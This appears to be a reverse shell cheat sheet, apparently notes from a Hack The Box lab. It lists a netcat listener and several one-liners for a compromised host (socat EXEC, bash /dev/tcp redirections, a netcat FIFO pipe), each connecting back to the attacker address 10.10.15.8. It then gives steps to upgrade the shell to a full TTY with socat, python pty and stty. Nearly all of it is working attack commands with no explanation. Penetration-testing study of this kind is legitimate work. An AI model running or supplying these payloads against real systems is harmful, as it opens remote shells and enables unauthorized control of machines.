# Reverse Shell

## Preventing Problems

```shell
my@attack:~$ bash
```

## Listener

```shell
my@attack:~$ nc -lvnp 9001
```

## Connecting from Compromised Machine

### Socat

```shell
htb-student@skills-foothold:~$ socat TCP4:10.10.15.8:9001 EXEC:'/bin/bash'
```

### Bash

```shell
htb-student@skills-foothold:~$ /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.15.8/9001 0>&1'
```

```shell
htb-student@skills-foothold:~$ /bin/bash -i >& /dev/tcp/10.10.15.8/9001 0>&1
```

```shell
htb-student@skills-foothold:~$ 0<&196;exec 196<>/dev/tcp/10.10.15.8/9001; /bin/bash <&196 >&196 2>&196
```

```shell
htb-student@skills-foothold:~$ exec 5<>/dev/tcp/10.10.15.8/9001;cat <&5 | while read line; do $line 2>&5 >&5; done
```

```shell
htb-student@skills-foothold:~$ /bin/bash -i 5<> /dev/tcp/10.10.15.8/9001 0<&5 1>&5 2>&5
```

### Netcat FIFO

```shell
htb-student@skills-foothold:~$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.15.8 9001 >/tmp/f
```

## Upgrading TTY (Socat)

### LISTEN

```shell
my@attack:~$ socat FILE:$(tty),raw,echo=0 TCP4-LISTEN:8443
```

### EXEC

```shell
htb-student@skills-foothold:~$ socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane TCP4:10.10.15.8:8443
```

## Upgrading TTY (Python PTY)

### Spawn

```shell
htb-student@skills-foothold:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Background

++control+z++

### Current Information

#### TERM

```shell
my@attack:~$ echo "$TERM"
```

```output title="Output"
xterm
```

#### Current Size

```shell
my@attack:~$ stty size
```

```output title="Output"
30 170
```

### Echo Input Characters

```shell
my@attack:~$ stty raw -echo
```

### Foreground

```shell
my@attack:~$ fg
```

### Set

```shell
htb-student@skills-foothold:~$ export SHELL=/bin/bash
htb-student@skills-foothold:~$ export TERM=xterm
htb-student@skills-foothold:~$ stty rows 30 columns 170
```

### Reset

```shell
htb-student@skills-foothold:~$ reset
```
